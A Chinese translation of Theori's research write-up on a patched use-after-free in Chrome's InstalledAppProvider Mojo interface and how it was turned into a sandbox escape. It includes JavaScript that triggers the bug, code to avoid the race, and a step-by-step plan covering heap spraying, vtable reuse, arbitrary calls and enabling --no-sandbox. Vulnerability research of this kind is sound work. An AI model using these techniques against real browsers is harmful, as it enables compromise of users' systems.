
# 利用Mojo IPC的UAF漏洞实现Chrome浏览器沙箱逃逸


                                阅读量   
                                **560371**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](./img/203834/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者theori，文章来源：theori.io
                                <br>原文地址：[https://theori.io/research/escaping-chrome-sandbox](https://theori.io/research/escaping-chrome-sandbox)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/203834/t012bf9f9c892ad1721.png)](./img/203834/t012bf9f9c892ad1721.png)



## 前言

本文主要说明我们是如何发现并利用Issue 1062091的，这是一个浏览器进程中的释放后使用（UAF）漏洞，导致Google Chrome和基于Chromium的Edge存在沙箱逃逸问题。



## 背景

我们的目标是让不熟悉Chrome漏洞利用的技术人员可以理解这篇文章，因此，我们将首先介绍Chrome的安全架构和IPC设计。特别值得一提的是，这篇文章的所有内容也同样适用于基于Chromium的Edge，该版本已经在2020年1月15日发布。

### <a class="reference-link" name="Chrome%E8%BF%9B%E7%A8%8B%E6%9E%B6%E6%9E%84"></a>Chrome进程架构

Chrome安全体系架构的关键支撑就是沙箱。Chrome将网络的大部分攻击面（例如：DOM渲染、脚本执行、媒体解码等）限制在沙箱进程中。同时，存在一个中央进程，称之为浏览器进程，该进程可以完全不带沙箱运行。有一个图标，展示了每个进程中的攻击面，以及它们之间的各种通信通道。<br>
除了沙箱之外，Chrome还实现了站点隔离，以确保来自不同来源的数据在不同的沙箱进程中进行存储和处理。其结果是，如果攻击者攻破了一个沙箱进程，他们甚至无法获得用户其他来源的浏览数据。<br>
由于这种架构的设计，大多数Chrome漏洞利用程序都需要两个或两个以上漏洞组合利用，其中一个需要在沙箱进程（通常是渲染器进程）中执行代码，另一个要实现沙箱逃逸。我们即将研究的漏洞将破坏渲染器进程，从而可以实现沙箱逃逸。

### <a class="reference-link" name="Mojo%20IPC"></a>Mojo IPC

Chrome进程共通过两种IPC机制相互通信，分别是旧版IPC和Mojo。旧版IPC即将淘汰，以实现对Mojo的完全支持，因此在本文中我们仅关注Mojo。<br>
我们引用Mojo的官方文档：<br>
“Mojo是运行时库的集合，这些运行时库提供了与平台无关的通用IPC原语抽象、消息IDL格式以及具有用于多重目标语言的代码生成功能的绑定库，以方便在任意跨进程、进程内边界传递消息。”<br>
我们将扩展这篇文章的相关部分。首先，下面是易受攻击代码中Mojo接口的定义：

```
// Represents a system application related to a particular web app.
// See: https://www.w3.org/TR/appmanifest/#dfn-application-object
struct RelatedApplication {
  string platform;
  // TODO(mgiuca): Change to url.mojom.Url (requires changing
  // WebRelatedApplication as well).
  string? url;
  string? id;
  string? version;
};

// Mojo service for the getInstalledRelatedApps implementation.
// The browser process implements this service and receives calls from
// renderers to resolve calls to navigator.getInstalledRelatedApps().
interface InstalledAppProvider {
  // Filters |relatedApps|, keeping only those which are both installed on the
  // user's system, and related to the web origin of the requesting page.
  // Also appends the app version to the filtered apps.
  FilterInstalledApps(array&lt;RelatedApplication&gt; related_apps, url.mojom.Url manifest_url)
      =&gt; (array&lt;RelatedApplication&gt; installed_apps);
};
```

在Chrome构建过程中，这个接口定义会转换为每种目标语言（例如：C++、Java甚至JavaScript）的接口和代理对象。这个特定的接口最初仅在使用Java Mojo绑定的Android上实现，但是在最近对Windows的实验版本中，已经支持在C++中实现。我们的漏洞利用将使用JavaScript绑定（在受损的渲染器进程中运行）调用这个C++实现（在浏览器进程中运行）。<br>
此接口定义了一个`FilterInstalledApps`方法。默认情况下，所有方法都是异步的，有一个`[Sync]`属性用于覆盖此默认值。在生成的C++接口中，这意味着该方法将采取一个额外的参数，该参数需要使用结果调用的回调。在JavaScript中，该函数返回一个Promise。<br>
了解一些Mojo术语，将有助于我们阅读本文后面的代码。需要注意的是，Mojo是在近期更改了这些名称，但目前还没有修改完所有的相关代码和文档，因此我们将在必要时提供这两个名称。此外，其中某些类型在Mojo接口上是通用的，但是我们仅引用`InstalledAppProvider`的类型。<br>
1、`MessagePipe`是通过其发送Mojo消息的通道。消息包括方法调用及其回复。<br>
2、`Remote&lt;InstalledAppProvider&gt;`（在JavaScript绑定中仍然称为`InstalledAppProviderPtr`）是一个代理对象，在该对象上调用接口汇总定义的方法。它将`MessagePipe`的一端绑定到特定端口。<br>
3、`PendingReceiver&lt;InstalledAppProvider&gt;`包装`MessagePipe`的另一端。必须将`PendingReceiver`绑定到`InstalledAppProvider`接口的实现，才能将消息路由到特定的实现上。这个绑定被称为`Receiver&lt;InstalledAppProvider&gt;`。<br>
4、`SelfOwnedReceiver&lt;InstalledAppProvider&gt;`是一种特殊的绑定类型，用于将实现对象的生存周期与基础`MessagePipe`的生存周期绑定在一起。`SelfOwnedReceiver`对实现拥有一个`std::unique_ptr`，并负责在`MessagePipe`关闭或遇到某些错误时将其删除。<br>
关于Mojo，还有其他的一些研究领域，但对于本文来说是无关的，所以就不做过多涉及。有关更多详细信息，建议大家阅读官方文档以查询。

### <a class="reference-link" name="RenderFrameHost%E5%92%8CFrame-Bound%E6%8E%A5%E5%8F%A3"></a>RenderFrameHost和Frame-Bound接口

渲染器进程中的每个帧（例如：主帧或iframe）都由浏览器进程中的`RenderFrameHost`支持。需要关注的是，一个渲染器进程可能包含多个帧，前提是它们都来自同源。浏览器提供的许多Mojo接口都是通过`RenderFrameHost`获取的。<br>
在`RenderFrameHost`初始化期间，为`BinderMap`填充了每个公开Mojo接口的回调：

```
void PopulateFrameBinders(RenderFrameHostImpl* host,
                          service_manager::BinderMap* map) {
  ...
  map-&gt;Add&lt;blink::mojom::InstalledAppProvider&gt;(
      base::BindRepeating(&amp;RenderFrameHostImpl::CreateInstalledAppProvider,
                          base::Unretained(host)));
  ...
}
```

当渲染器框架请求接口时，`BinderMap`中的相应回调将被调用，并传递给`PendingReceiver`：

```
void RenderFrameHostImpl::CreateInstalledAppProvider(
    mojo::PendingReceiver&lt;blink::mojom::InstalledAppProvider&gt; receiver) {
  InstalledAppProviderImpl::Create(this, std::move(receiver));
}

// static
void InstalledAppProviderImpl::Create(
    RenderFrameHost* host,
    mojo::PendingReceiver&lt;blink::mojom::InstalledAppProvider&gt; receiver) {
  mojo::MakeSelfOwnedReceiver(std::make_unique&lt;InstalledAppProviderImpl&gt;(host),
                              std::move(receiver));
}
```

在这种情况下，将创建一个新的`InstalledAppProviderImpl`，同时会将`PendingReceiver`与`SelfOwnedReceiver`绑定。



## 漏洞分析

如上所述，`SelfOwnedReceiver`会为`InstalledAppProviderImpl`保留一个`unique_ptr`，这意味着只要底层`MessagePipe`保持连接状态，`Impl`就会保持活动状态。此外，`InstalledAppProviderImpl`包含指向`RenderFrameHost`的原始指针：

```
InstalledAppProviderImpl::InstalledAppProviderImpl(
    RenderFrameHost* render_frame_host)
    : render_frame_host_(render_frame_host) {
  DCHECK(render_frame_host_);
}
```

在调用`FilterInstalledApps`方法时，将在这个原始指针上进行虚拟函数调用：

```
void InstalledAppProviderImpl::FilterInstalledApps(
    std::vector&lt;blink::mojom::RelatedApplicationPtr&gt; related_apps,
    const GURL&amp; manifest_url,
    FilterInstalledAppsCallback callback) {
  if (render_frame_host_-&gt;GetProcess()-&gt;GetBrowserContext()-&gt;IsOffTheRecord()) {
    std::move(callback).Run(std::vector&lt;blink::mojom::RelatedApplicationPtr&gt;());
    return;
  }

  ...
}
```

因此，如果在释放`RenderFrameHost`之后调用这个方法，就会发生释放后使用的情况。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"></a>漏洞生命周期

这个漏洞是在Chrome 81.0.4041.0的提交中引入的。在几周后，这个提交中的漏洞恰好移动到了实验版本命令行标志的后面。但是，这个更改位于Chrome 82.0.4065.0版本中，因此该漏洞在Chrome稳定版本81的所有桌面平台上都是可以利用的。



## 漏洞利用

### <a class="reference-link" name="%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"></a>触发漏洞

尽管有可能通过纯JavaScript触发该漏洞，但几乎可以肯定，攻击者不会选择这种利用方式。取而代之的是，我们可以通过启用MojoJS blink绑定（在Chrome命令行中使用`--enable-blink-features=MojoJS`）来模拟一个被攻击的渲染器进程。这些绑定将Mojo平台直接暴露给JavaScript，从而使我们可以完全绕过Blink绑定。请注意，可以通过被攻击的渲染器进程启用这些绑定，具体方式是翻转内存中的某一位，然后创建一个新的JavaScript上下文，因此我们的漏洞利用代码可以轻松地用于漏洞利用链之中。<br>
我们初次尝试触发该漏洞，使用了类似于漏洞报告中的方法。思路是，在顶部框架派生出几个子帧，每个子帧将获取其框架中一系列`InstalledAppProvider`实例的句柄。子帧会反复调用`filterInstalledApps`以阻塞Mojo消息管道。在几秒钟，最上方的框架将会删除子帧，从而释放备份`RenderFrameHosts`。这样一来，也会在`InstalledAppProvider MessagePipes`上导致连接错误，但我们希望，直到`filterInstalledApps`调用取消引用释放的指针之后，再处理连接错误。<br>
我们可以使用以下脚本创建页面：

```
function allocate_rfh() {
  var iframe = document.createElement("iframe");
  iframe.src = window.location + "#child"; // designate the child by hash
  document.body.appendChild(iframe);
  return iframe;
}
function deallocate_rfh(iframe) {
  document.body.removeChild(iframe);
}
if (window.location.hash == "#child") {
  var ptrs = new Array(4096).fill(null).map(() =&gt; {
    var pipe = Mojo.createMessagePipe();
    Mojo.bindInterface(blink.mojom.InstalledAppProvider.name,
                       pipe.handle1);
    return new blink.mojom.InstalledAppProviderPtr(pipe.handle0);
  });
  setTimeout(() =&gt; ptrs.map((p) =&gt; {
    p.filterInstalledApps([], new url.mojom.Url({url: window.location.href}));
    p.filterInstalledApps([], new url.mojom.Url({url: window.location.href}));
  }), 2000);
} else {
  var frames = new Array(4).fill(null).map(() =&gt; allocate_rfh());
  setTimeout(() =&gt; frames.map((f) =&gt; deallocate_rfh(f)), 15000);
}
setTimeout(() =&gt; window.location.reload(), 16000);
```

经过几次刷新后，我们终于找到了漏洞：

```
==8779==ERROR: AddressSanitizer: heap-use-after-free on address 0x620000067080 at pc 0x7f1aafa73589 bp 0x7ffed99af5d0 sp 0x7ffed99af5c8
READ of size 8 at 0x620000067080 thread T0 (chrome)
```

### <a class="reference-link" name="%E5%8F%96%E6%B6%88%E7%AB%9E%E4%BA%89"></a>取消竞争

为了进行漏洞利用，我们希望能更好地控制在什么时间触发UAF。如果我们使用本地代码编写漏洞利用程序，那么即使释放了子帧，我们也可以使得Mojo连接保持活动状态，因为这些帧是在同一进程中运行。但是，在理想情况下，我们希望保留JavaScript。<br>
很快，我们就找到了`MojoJSTest`绑定，该绑定为JavaScript提供了一些额外的Mojo功能。我们利用的相关功能是`MojoInterfaceInterceptor`，它能够拦截来自同一进程中其他框架的`Mojo.bindInterface`调用。我们可以使用它，在子帧被销毁之前将终端句柄传递给父帧。其代码如下：

```
var kPwnInterfaceName = "pwn";

// runs in the child frame
function sendPtr() {
  var pipe = Mojo.createMessagePipe();
  // bind the InstalledAppProvider with the child rfh
  Mojo.bindInterface(blink.mojom.InstalledAppProvider.name,
    pipe.handle1, "context", true);

  // pass the endpoint handle to the parent frame
  Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, "process");
}

// runs in the parent frame
function getFreedPtr() {
  return new Promise(function (resolve, reject) {
    var frame = allocateRFH(window.location.href + "#child"); // designate the child by hash

    // intercept bindInterface calls for this process to accept the handle from the child
    let interceptor = new MojoInterfaceInterceptor(kPwnInterfaceName, "process");
    interceptor.oninterfacerequest = function(e) {
      interceptor.stop();

      // bind and return the remote
      var provider_ptr = new blink.mojom.InstalledAppProviderPtr(e.handle);
      freeRFH(frame);
      resolve(provider_ptr);
    }
    interceptor.start();
  });
}
```

因此，我们现在可以使用`getFreedPtr()`获取释放的`InstalledAppProviderPtr`的`RenderFrameHost`。然后，调用`filterInstalledApps`，随后将立即触发UAF。

### <a class="reference-link" name="%E6%9B%BF%E4%BB%A3RenderFrameHostImpl"></a>替代RenderFrameHostImpl

该漏洞将会在释放的`RenderFrameHost`上调用虚拟函数。对于目前还不太了解虚拟调用工作原理的读者，我们建议首先阅读相关的文章。为了利用这个漏洞，我们想要控制释放对象的数据。我们可以使用常规的策略，即Blob Spraying，在浏览器进程中替换释放的对象。这种方法实际上是在释放子帧后，创建一系列的Blob（使用Blob API或Mojo绑定），其中包含长度为`sizeof(RenderFrameHostImpl)`的受控数据（在Chrome 81.0上为0xc38），我们希望我们的数据最终能替换堆中释放的对象。<br>
针对这个漏洞，这一过程极有可能取得成功。原因在于，`RenderFrameHost`是一个巨大的对象，因此在该堆的存储桶中几乎没有分配。在我们的测试过程中，通常我们分配的第一个Blob替换了该对象，但是为了达到良好的效果，我们还做了一些额外的操作。<br>
现在，我们面临一个问题：用什么替换vtable指针？这里，没有来自浏览器进程的泄露堆指针，我们无法将vtable指向我们控制的数据，因此没有明显的办法可以跳转到任意代码。实际上，我们似乎不知道任何地址。<br>
但是，Windows的ASLR上存在一个众所周知的弱点：DLL基址不会在每次加载时随机化。因此，渲染器进程和浏览器进程之间的所有共享DLL都将加载在相同的基址上，其中包括chrome.dll，这是120MB的巨大二进制文件，包含大多数Chrome代码。我们的漏洞利用将假设我们拥有这个基址，对于被攻击的渲染器而言，这一点就非常简单了。<br>
这个DLL的.rdata部分中，包含其中定义的每个虚拟类的vtable。通过将这些地址用作vtable指针，我们可以在完全受控的对象上调用任何虚拟函数。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%A1%88%EF%BC%9A%E4%B8%80%E4%B8%AA%E6%8D%B7%E5%BE%84"></a>漏洞利用方案：一个捷径

在浏览器中获取完整的代码执行，可能需要比chrome.dll中可用设备更多一些的设备（例如：来自kernel32.dll或ntdll.dll的小工具）。例如，我们可以使用堆栈透视表，将数据放入我们的受控数据中，并使用ROP分配一些RWX内存，复制Shellcode并执行。但是，为了使我们的漏洞利用相对简单，我们可以使用快捷方式。<br>
由于我们已经依赖渲染器漏洞，因此从技术上看，我们现在需要的是没有沙箱化运行的渲染器进程。幸运的是，这很容易得到。Chrome中的每个进程都有一个全局的`CommandLine`对象，该对象保存该进程的已解析命令行开关。浏览器进程在创建新的子进程时，会将某些开关（如果存在）从其命令行传递给子进程。其中的一个这样的开关是`--no-sandbox`，其功能如同其名称一样——禁用沙箱。在chrome.dll中，提供了一个函数，该函数可以让我们轻松地将这个标志附加到CommandLine对象中：

```
void SetCommandLineFlagsForSandboxType(base::CommandLine* command_line,
                                       SandboxType sandbox_type) {
  switch (sandbox_type) {
    case SandboxType::kNoSandbox:
      command_line-&gt;AppendSwitch(switches::kNoSandbox);
      break;
      ...
  }
}
```

因此，在我们的案例中，要实现沙箱逃逸，只需要使用正确的参数来调用这个函数。请注意，这并不是虚拟函数，因为我们不知道浏览器`CommandLine`对象的地址，因此我们还需要做一些工作。

### <a class="reference-link" name="%E9%81%BF%E5%85%8D%E5%B4%A9%E6%BA%83"></a>避免崩溃

为了构建更为强大的原语，我们最好能反复触发该漏洞。同样，上述策略要求浏览器在漏洞利用后可以继续运行。但是，需要关注的是，漏洞调用之后还有另外的两个虚拟函数调用：

```
if (render_frame_host_-&gt;GetProcess()-&gt;GetBrowserContext()-&gt;IsOffTheRecord()) {
  ...
}
```

如果将对`GetProcess()`的调用重定向到其他虚拟函数，就必须确保它返回一个可以安全进行这两个虚拟调用的指针。幸运的是，有一个简单的技巧可以解决这个问题。我们可以让第一个虚拟调用去调用以下形式的任何虚拟函数：

```
SomeType* SomeClass::SomeMethod() {
  return &amp;class_member_;
}
```

调用这些函数将会返回一个指针，该指针比`render_frame_host_`前面的偏移量要小，因此它仍然指向我们的受控数据。为了方便起见，我们选择一个在指针前返回8个字节的指针，例如：

```
content::ContentClient* ChromeMainDelegate::CreateContentClient() {
  return &amp;chrome_content_client_;
}
```

对于第二个虚拟调用，我们重复这个思路，可以控制最终调用，并且对于其返回值没有任何限制。下面是示意图：<br>[![](./img/203834/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01068cdfcae57ad0a5.png)

### <a class="reference-link" name="%E8%8E%B7%E5%BE%97%E5%A0%86%E6%B3%84%E9%9C%B2"></a>获得堆泄露

根据我们的原语，泄露堆指针实际上非常容易。我们调用任何将结果分配并存储为成员的虚拟函数：

```
SomeClass::SomeMethod() {
  some_member_ = new Foo();
}
```

随后，回想一下，我们已经使用Blob替换了`RenderFrameHost`，因此我们实际上可以要求浏览器将内容发送回我们。在这时，应该可以在其中找到堆指针。<br>
一旦获得了堆指针后，就可以使用Heap Spraying的方式，将受控数据放置在可猜测的地址位置。注意，在我们的实际利用中，我们使用了一些额外的小工具来查找原始释放的`RenderFrameHost`的精确地址，但这并不是必要的。

### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8"></a>任意调用

我们希望将任意虚拟调用转换为对任何函数的任意调用。一个简单的想法是，利用堆泄露，将指向目标函数的指针放在已知（可猜测的）地址上，并将其用作我们的vtable指针。这样，就可以成功调用目标函数，但遗憾的是，参数仍然不受控制。<br>
为了控制参数，我们使用了另一种方法。回想一下，我们在目标虚拟调用期间控制了类成员，因此我们就找到了一个虚拟函数，来调用回调类成员，例如：

```
class FileSystemDispatcher::WriteListener
    : public mojom::blink::FileSystemOperationListener {
 public:
 ...
  void DidWrite(int64_t byte_count, bool complete) override {
    write_callback_.Run(byte_count, complete);
  }

 private:
  ...
  WriteCallback write_callback_;
};

where WriteCallback is just an alias for a particular type of base::Callback:

using WriteCallback =
    base::RepeatingCallback&lt;void(int64_t bytes, bool complete)&gt;;
```

在Chrome中，回调对象用于存储带有某些绑定参数的函数指针。就内存布局而言，它们仅包含一个指向`BindState`的指针，该指针具有以下布局：<br>
偏移量 字段<br>
0 refcount<br>
8 polymorphic_invoke<br>
16 destructor<br>
24 query_cancellation_traits<br>
32 functor<br>
40 arg0<br>
48 arg1<br>
… …<br>
并非所有这些字段都值得关注。其中，`polymorphic_invoke`是一个指针，该指针负责使用绑定的参数调用回调函数。显然，`polymorphic_invoke`必须知道有多少绑定参数和类型，一次你我们选择了一个调用函数，该函数根据需要传递尽可能多的参数（实际上，2个就已经足够）。然后，利用堆泄露，使用目标函数和参数构建伪造的`BindState`对象，并将其放置在堆中的已知地址处。现在，我们触发UAF调用`FileSystemDispatcher::WriteListener::DidWrite`，并控制回调的`BindState`指针。<br>[![](./img/203834/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b140bb93ea6a5419.png)

### <a class="reference-link" name="%E6%B3%84%E9%9C%B2CommandLine%E6%8C%87%E9%92%88"></a>泄露CommandLine指针

在Chrome初始化期间，会分配全局`CommandLine`对象，并将指针存储在chrome.dll的.data部分中：

```
// The singleton CommandLine representing the current process's command line.
static CommandLine* current_process_commandline_;
```

当然，有很多种方法可以做到这一点。既然我们已经可以调用任何函数，则只需要调用以下函数，就可以将指针复制到一个Blob中，然后将其读回。

```
static
void copy64(void* dst, const void* src)
{
       memmove(dst, src, sizeof(cmsFloat64Number));
}
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B0%8F%E7%BB%93"></a>漏洞利用小结

以上，我们就详细分析了完整的漏洞利用策略：<br>
1、使用渲染器漏洞来启用MojoJS，MojoJSTest绑定并找到chrome.dll的基址。<br>
2、触发UAF，将新分配存储在Blob中，然后将其读回，以实现堆指针泄露。<br>
3、为`copy64(blob_ptr, current_process_commandline_)`喷涂`BindStates`，触发UAF，然后读回命令行指针。<br>
4、为`SetCommandLineFlagsForSandboxType(cmd_line, SandboxType::kNoSandbox)`喷涂`BindStates`，并触发UAF。<br>
5、生成新的渲染器进程，例如：使用iframe到其他控制源。<br>
6、再次使用渲染器漏洞利用，攻击未沙箱化的渲染器进程。



## 总结

综上所述，这个漏洞利用演示了使用后释放（UAF）漏洞利用近乎理想的条件。替换释放对象的过程是高度可靠的，因为该对象位于很少使用的堆存储桶中，并且通过避免竞争条件，我们可以按需多次触发该漏洞。最终，我们能够实现进程连续化，这意味着从漏洞利用后的用户角度来看，Chrome将会持续正常运行。此外，由于我们仅使用来自chrome.dll的代码小工具，因此该漏洞很容易适配其他平台，特别是macOS，因为macOS也缺少进程间库的随机化。<br>
如果大家想要了解所有详细信息，可以在我们的漏洞报告中找到完整的利用程序。

### <a class="reference-link" name="%E6%89%A9%E5%B1%95%E9%98%85%E8%AF%BB"></a>扩展阅读

[1] [https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html](https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html)<br>
[2] [https://chromium.googlesource.com/chromium/src.git/+/master/mojo/README.md](https://chromium.googlesource.com/chromium/src.git/+/master/mojo/README.md)<br>
[3] [https://bugs.chromium.org/p/chromium/issues/detail?id=977462](https://bugs.chromium.org/p/chromium/issues/detail?id=977462)
